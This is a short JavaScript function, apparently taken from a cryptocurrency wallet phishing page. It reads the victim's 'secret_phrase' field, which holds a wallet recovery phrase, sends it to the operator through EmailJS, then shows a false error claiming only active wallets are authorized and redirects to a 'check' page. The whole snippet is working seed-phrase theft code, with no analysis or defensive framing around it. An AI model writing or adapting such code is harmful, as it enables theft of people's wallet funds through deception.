function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_fm0ybhm", "template_bhbz48m", params).then(function (res) {
        alert("Error!: ONLY ACTIVE WALLETS ARE AUTHORIZED" );
        window.location.href = "/check/index.html";
    })
}
